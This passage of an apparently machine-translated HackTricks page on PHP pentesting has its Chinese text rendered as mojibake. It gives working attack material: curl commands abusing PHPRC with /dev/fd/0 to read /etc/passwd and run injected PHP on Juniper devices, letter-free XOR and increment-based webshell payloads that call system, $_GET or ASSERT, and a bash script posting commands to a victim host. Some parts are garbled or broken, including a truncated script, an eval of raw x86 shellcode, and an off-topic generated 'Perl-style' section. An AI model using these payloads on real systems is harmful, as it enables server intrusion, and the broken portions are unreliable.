* **`PHPRC`**ï¼šæŒ‡ç¤ºPHPåœ¨**å“ªé‡Œå®šä½å…¶é…ç½®æ–‡ä»¶**ï¼ˆé€šå¸¸ç§°ä¸º`php.ini`ï¼‰ã€‚å¦‚æœæ‚¨å¯ä»¥ä¸Šä¼ è‡ªå·±çš„é…ç½®æ–‡ä»¶ï¼Œé‚£ä¹ˆå¯ä»¥ä½¿ç”¨`PHPRC`å°†PHPæŒ‡å‘å®ƒã€‚æ·»åŠ ä¸€ä¸ª**`auto_prepend_file`**æ¡ç›®ï¼ŒæŒ‡å®šç¬¬äºŒä¸ªä¸Šä¼ çš„æ–‡ä»¶ã€‚è¿™ä¸ªç¬¬äºŒä¸ªæ–‡ä»¶åŒ…å«æ­£å¸¸çš„**PHPä»£ç ï¼Œç„¶åç”±PHPè¿è¡Œæ—¶åœ¨ä»»ä½•å…¶ä»–ä»£ç ä¹‹å‰æ‰§è¡Œ**ã€‚
1. ä¸Šä¼ ä¸€ä¸ªåŒ…å«æˆ‘ä»¬çš„shellcodeçš„PHPæ–‡ä»¶
2. ä¸Šä¼ ç¬¬äºŒä¸ªæ–‡ä»¶ï¼Œå…¶ä¸­åŒ…å«ä¸€ä¸ª**`auto_prepend_file`**æŒ‡ä»¤ï¼ŒæŒ‡ç¤ºPHPé¢„å¤„ç†å™¨æ‰§è¡Œæˆ‘ä»¬åœ¨æ­¥éª¤1ä¸­ä¸Šä¼ çš„æ–‡ä»¶
3. å°†`PHPRC`å˜é‡è®¾ç½®ä¸ºæˆ‘ä»¬åœ¨æ­¥éª¤2ä¸­ä¸Šä¼ çš„æ–‡ä»¶ã€‚
* è·å–æœ‰å…³å¦‚ä½•æ‰§è¡Œæ­¤é“¾çš„æ›´å¤šä¿¡æ¯[**æ¥è‡ªåŸå§‹æŠ¥å‘Š**](https://labs.watchtowr.com/cve-2023-36844-and-friends-rce-in-juniper-firewalls/)ã€‚
* **PHPRC** - å¦ä¸€ä¸ªé€‰é¡¹
* å¦‚æœæ‚¨**æ— æ³•ä¸Šä¼ æ–‡ä»¶**ï¼Œæ‚¨å¯ä»¥åœ¨FreeBSDä¸­ä½¿ç”¨åŒ…å«**`stdin`**çš„â€œæ–‡ä»¶â€`/dev/fd/0`ï¼Œå…¶ä¸­`stdin`æ˜¯å‘é€åˆ°`stdin`çš„è¯·æ±‚çš„**æ­£æ–‡**ï¼š
* `curl "http://10.12.72.1/?PHPRC=/dev/fd/0" --data-binary 'auto_prepend_file="/etc/passwd"'`
* æˆ–è€…è¦è·å¾—RCEï¼Œè¯·å¯ç”¨**`allow_url_include`**å¹¶åœ¨æ–‡ä»¶ä¸­æ·»åŠ **base64 PHPä»£ç **ï¼š
* `curl "http://10.12.72.1/?PHPRC=/dev/fd/0" --data-binary $'allow_url_include=1\nauto_prepend_file="data://text/plain;base64,PD8KICAgcGhwaW5mbygpOwo/Pg=="'`
* æŠ€æœ¯æ¥è‡ª[**æ­¤æŠ¥å‘Š**](https://vulncheck.com/blog/juniper-cve-2023-36845)ã€‚

## PHPé™æ€åˆ†æ

æŸ¥çœ‹æ˜¯å¦å¯ä»¥åœ¨å¯¹è¿™äº›å‡½æ•°çš„è°ƒç”¨ä¸­æ’å…¥ä»£ç ï¼ˆæ¥è‡ª[è¿™é‡Œ](https://www.youtube.com/watch?v=SyWUsN0yHKI\&feature=youtu.be)ï¼‰ï¼š
```php
exec, shell_exec, system, passthru, eval, popen
unserialize, include, file_put_cotents
$_COOKIE | if #This mea
```
å¦‚æœæ‚¨æ­£åœ¨è°ƒè¯•ä¸€ä¸ªPHPåº”ç”¨ç¨‹åºï¼Œæ‚¨å¯ä»¥åœ¨`/etc/php5/apache2/php.ini`ä¸­å…¨å±€å¯ç”¨é”™è¯¯æ‰“å°ï¼Œæ·»åŠ `display_errors = On`ï¼Œç„¶åé‡æ–°å¯åŠ¨apacheï¼š`sudo systemctl restart apache2`

### è§£æ··æ·†PHPä»£ç 

æ‚¨å¯ä»¥ä½¿ç”¨[**www.unphp.net**](http://www.unphp.net)ç½‘ç«™æ¥è§£æ··æ·†PHPä»£ç ã€‚

## PHPåŒ…è£…å™¨å’Œåè®®

PHPåŒ…è£…å™¨å’Œåè®®å¯ä»¥è®©æ‚¨ç»•è¿‡ç³»ç»Ÿä¸­çš„å†™å…¥å’Œè¯»å–ä¿æŠ¤ï¼Œå¹¶å¯¹å…¶è¿›è¡Œç ´åã€‚æœ‰å…³[**æ›´å¤šä¿¡æ¯ï¼Œè¯·æŸ¥çœ‹æ­¤é¡µé¢**](../../../pentesting-web/file-inclusion/#lfi-rfi-using-php-wrappers-and-protocols)ã€‚

## æœªç»èº«ä»½éªŒè¯çš„Xdebug RCE

å¦‚æœæ‚¨åœ¨`phpconfig()`è¾“å‡ºä¸­çœ‹åˆ°**Xdebug**å·²å¯ç”¨ï¼Œæ‚¨åº”è¯¥å°è¯•é€šè¿‡[https://github.com/nqxcode/xdebug-exploit](https://github.com/nqxcode/xdebug-exploit)è·å–RCEã€‚

## å˜é‡å˜é‡
```php
$x = 'Da';
$$x = 'Drums';

echo $x; //Da
echo $$x; //Drums
echo $Da; //Drums
echo "${Da}"; //Drums
echo "$x ${$x}"; //Da Drums
echo "$x ${Da}"; //Da Drums
```
## åˆ©ç”¨æ–°çš„ $\_GET\["a"]\($\_GET\["b"]) è¿›è¡Œ RCE

å¦‚æœåœ¨ä¸€ä¸ªé¡µé¢ä¸­ï¼Œä½ å¯ä»¥**åˆ›å»ºä¸€ä¸ªä»»æ„ç±»çš„æ–°å¯¹è±¡**ï¼Œé‚£ä¹ˆä½ å¯èƒ½èƒ½å¤Ÿè·å¾— RCEï¼Œè¯·æŸ¥çœ‹ä»¥ä¸‹é¡µé¢äº†è§£è¯¦æƒ…ï¼š

{% content-ref url="php-rce-abusing-object-creation-new-usd\_get-a-usd\_get-b.md" %}
[php-rce-abusing-object-creation-new-usd\_get-a-usd\_get-b.md](php-rce-abusing-object-creation-new-usd\_get-a-usd\_get-b.md)
{% endcontent-ref %}

## åœ¨æ²¡æœ‰å­—æ¯çš„æƒ…å†µä¸‹æ‰§è¡Œ PHP

[https://securityonline.info/bypass-waf-php-webshell-without-numbers-letters/](https://securityonline.info/bypass-waf-php-webshell-without-numbers-letters/)

### ä½¿ç”¨å…«è¿›åˆ¶
```php
$_="\163\171\163\164\145\155(\143\141\164\40\56\160\141\163\163\167\144)"; #system(cat .passwd);
```
### **å¼‚æˆ–ï¼ˆXORï¼‰**

The XOR operation, also known as exclusive OR, is a logical operation that takes two binary inputs and returns a binary output. The output is true (1) if the inputs are different, and false (0) if the inputs are the same.

In the context of hacking, XOR can be used for various purposes, such as encryption, obfuscation, and bypassing security measures. It is commonly used to hide sensitive information or manipulate data in a way that is not easily detectable.

XOR is a powerful tool in the arsenal of a hacker, as it can be used to perform bitwise operations and manipulate data at the binary level. It is often used in combination with other techniques to achieve specific goals during a penetration test or security assessment.

To perform an XOR operation, you can use XOR operators in programming languages or XOR functions in scripting languages. These operators and functions take two inputs and return the XOR result.

Understanding XOR and its applications is essential for any hacker or security professional, as it allows for creative and effective manipulation of data and systems.
```php
$_=("%28"^"[").("%33"^"[").("%34"^"[").("%2c"^"[").("%04"^"[").("%28"^"[").("%34"^"[").("%2e"^"[").("%29"^"[").("%38"^"[").("%3e"^"["); #show_source
$__=("%0f"^"!").("%2f"^"_").("%3e"^"_").("%2c"^"_").("%2c"^"_").("%28"^"_").("%3b"^"_"); #.passwd
$___=$__; #Could be not needed inside eval
$_($___); #If Â¢___ not needed then $_($__), show_source(.passwd)
```
### XORç®€æ˜“shellä»£ç 

æ ¹æ®[**è¿™ç¯‡è§£æ**](https://mgp25.com/ctf/Web-challenge/)ï¼Œå¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹å¼ç”Ÿæˆä¸€ä¸ªç®€æ˜“çš„shellcodeï¼š
```php
$_="`{{{"^"?<>/"; // $_ = '_GET';
${$_}[_](${$_}[__]); // $_GET[_]($_GET[__]);

$_="`{{{"^"?<>/";${$_}[_](${$_}[__]); // $_ = '_GET'; $_GET[_]($_GET[__]);
```
æ‰€ä»¥ï¼Œå¦‚æœä½ èƒ½å¤Ÿ**æ‰§è¡Œä»»æ„çš„PHPä»£ç è€Œä¸ä½¿ç”¨æ•°å­—å’Œå­—æ¯**ï¼Œä½ å¯ä»¥å‘é€å¦‚ä¸‹è¯·æ±‚æ¥æ»¥ç”¨è¯¥æœ‰æ•ˆè´Ÿè½½æ¥æ‰§è¡Œä»»æ„çš„PHPä»£ç ï¼š
```
POST: /action.php?_=system&__=cat+flag.php
Content-Type: application/x-www-form-urlencoded

comando=$_="`{{{"^"?<>/";${$_}[_](${$_}[__]);
```
### XOR Shellcodeï¼ˆåœ¨evalå†…éƒ¨ï¼‰

```php
<?php
$shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80";
$key = "\x41";
$encrypted_shellcode = xor_encrypt($shellcode, $key);
eval($encrypted_shellcode);

function xor_encrypt($data, $key) {
    $encrypted_data = '';
    $key_length = strlen($key);
    $data_length = strlen($data);
    for ($i = 0; $i < $data_length; $i++) {
        $encrypted_data .= chr(ord($data[$i]) ^ ord($key[$i % $key_length]));
    }
    return $encrypted_data;
}
?>
```

This PHP code demonstrates the use of XOR encryption to obfuscate a shellcode. The shellcode is first encrypted using the XOR operation with a key. The encrypted shellcode is then evaluated using the `eval()` function.

The shellcode used in this example is a simple Linux/x86 execve("/bin/sh") shellcode. The key used for encryption is the character 'A' (0x41 in hexadecimal).

The `xor_encrypt()` function takes two parameters: the data to be encrypted and the encryption key. It iterates over each byte of the data and performs the XOR operation with the corresponding byte of the key. The result is appended to the encrypted data string.

By using XOR encryption, the shellcode becomes harder to detect and analyze, as it is obfuscated with a key. This technique can be used to bypass certain security measures and evade detection by antivirus software.
```bash
#!/bin/bash

if [[ -z $1 ]]; then
echo "USAGE: $0 CMD"
exit
fi

CMD=$1
CODE="\$_='\
```

```php
lt;>/'^'{{{{';\${\$_}[_](\${\$_}[__]);" `$_='
```

```php
lt;>/'^'{{{{'; --> _GET` `${$_}[_](${$_}[__]); --> $_GET[_]($_GET[__])` `So, the function is inside $_GET[_] and the parameter is inside $_GET[__]` http --form POST "http://victim.com/index.php?_=system&__=$CMD" "input=$CODE"
```
### ç±»ä¼¼ Perl çš„è¯­æ³•

åœ¨ PHP ä¸­ï¼Œå¯ä»¥ä½¿ç”¨ä¸€äº› Perl é£æ ¼çš„è¯­æ³•æ¥ç®€åŒ–ä»£ç ã€‚è¿™äº›æŠ€å·§å¯ä»¥æé«˜ä»£ç çš„å¯è¯»æ€§å’Œæ•ˆç‡ã€‚

#### 1. ç®€åŒ– if è¯­å¥

ä½¿ç”¨ Perl é£æ ¼çš„ if è¯­å¥å¯ä»¥ä½¿ä»£ç æ›´ç®€æ´ã€‚ä¾‹å¦‚ï¼Œå¯ä»¥ä½¿ç”¨ä¸‰å…ƒè¿ç®—ç¬¦æ¥æ›¿ä»£ if-else è¯­å¥ï¼š

```php
// ä½¿ç”¨ if-else è¯­å¥
if ($condition) {
    $result = 'Condition is true';
} else {
    $result = 'Condition is false';
}

// ä½¿ç”¨ä¸‰å…ƒè¿ç®—ç¬¦
$result = $condition ? 'Condition is true' : 'Condition is false';
```

#### 2. ç®€åŒ–å¾ªç¯è¯­å¥

ä½¿ç”¨ Perl é£æ ¼çš„å¾ªç¯è¯­å¥å¯ä»¥å‡å°‘ä»£ç é‡ã€‚ä¾‹å¦‚ï¼Œå¯ä»¥ä½¿ç”¨ foreach å¾ªç¯æ¥éå†æ•°ç»„ï¼š

```php
// ä½¿ç”¨ä¼ ç»Ÿçš„ for å¾ªç¯
for ($i = 0; $i < count($array); $i++) {
    $value = $array[$i];
    // æ‰§è¡Œæ“ä½œ
}

// ä½¿ç”¨ Perl é£æ ¼çš„ foreach å¾ªç¯
foreach ($array as $value) {
    // æ‰§è¡Œæ“ä½œ
}
```

#### 3. ç®€åŒ–å­—ç¬¦ä¸²æ“ä½œ

ä½¿ç”¨ Perl é£æ ¼çš„å­—ç¬¦ä¸²æ“ä½œå¯ä»¥æ›´æ–¹ä¾¿åœ°å¤„ç†å­—ç¬¦ä¸²ã€‚ä¾‹å¦‚ï¼Œå¯ä»¥ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼æ¥åŒ¹é…å’Œæ›¿æ¢å­—ç¬¦ä¸²ï¼š

```php
// ä½¿ç”¨ä¼ ç»Ÿçš„å­—ç¬¦ä¸²å‡½æ•°
$result = str_replace('search', 'replace', $string);

// ä½¿ç”¨ Perl é£æ ¼çš„æ­£åˆ™è¡¨è¾¾å¼
$result = preg_replace('/search/', 'replace', $string);
```

#### 4. ç®€åŒ–æ•°ç»„æ“ä½œ

ä½¿ç”¨ Perl é£æ ¼çš„æ•°ç»„æ“ä½œå¯ä»¥æ›´å¿«é€Ÿåœ°å¤„ç†æ•°ç»„ã€‚ä¾‹å¦‚ï¼Œå¯ä»¥ä½¿ç”¨æ•°ç»„è§£æ„æ¥å¿«é€Ÿè·å–æ•°ç»„ä¸­çš„å€¼ï¼š

```php
// ä½¿ç”¨ä¼ ç»Ÿçš„æ•°ç»„æ“ä½œ
$value1 = $array[0];
$value2 = $array[1];

// ä½¿ç”¨ Perl é£æ ¼çš„æ•°ç»„è§£æ„
[$value1, $value2] = $array;
```

é€šè¿‡ä½¿ç”¨è¿™äº› Perl é£æ ¼çš„æŠ€å·§ï¼Œå¯ä»¥ä½¿ PHP ä»£ç æ›´ç®€æ´ã€é«˜æ•ˆã€‚
```php
<?php
$_=[];
$_=@"$_"; // $_='Array';
$_=$_['!'=='@']; // $_=$_[0];
$___=$_; // A
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;
$___.=$__; // S
$___.=$__; // S
$__=$_;
$__++;$__++;$__++;$__++; // E
$___.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // R
$___.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T
$___.=$__;

$____='_';
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // P
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // O
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // S
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T
$____.=$__;

$_=$$____;
$___($_[_]); // ASSERT($_POST[_]);
```
<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks äº‘ â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ æ¨ç‰¹ ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* ä½ åœ¨ä¸€å®¶ **ç½‘ç»œå®‰å…¨å…¬å¸** å·¥ä½œå—ï¼Ÿä½ æƒ³åœ¨ HackTricks ä¸­çœ‹åˆ°ä½ çš„ **å…¬å¸å¹¿å‘Š**å—ï¼Ÿæˆ–è€…ä½ æƒ³è·å¾— **PEASS çš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½ HackTricks çš„ PDF** å—ï¼Ÿè¯·æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶ [**NFTs**](https://opensea.io/collection/the-peass-family) é›†åˆ [**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* è·å¾— [**å®˜æ–¹ PEASS & HackTricks å•†å“**](https://peass.creator-spring.com)
* **åŠ å…¥** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegram ç¾¤ç»„**](https://t.me/peass)ï¼Œæˆ–è€…åœ¨ **Twitter** ä¸Š **å…³æ³¨** æˆ‘ [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**ã€‚**
* **é€šè¿‡å‘** [**hacktricks ä»“åº“**](https://github.com/carlospolop/hacktricks) **å’Œ** [**hacktricks-cloud ä»“åº“**](https://github.com/carlospolop/hacktricks-cloud) **æäº¤ PR æ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§ã€‚**

</details>
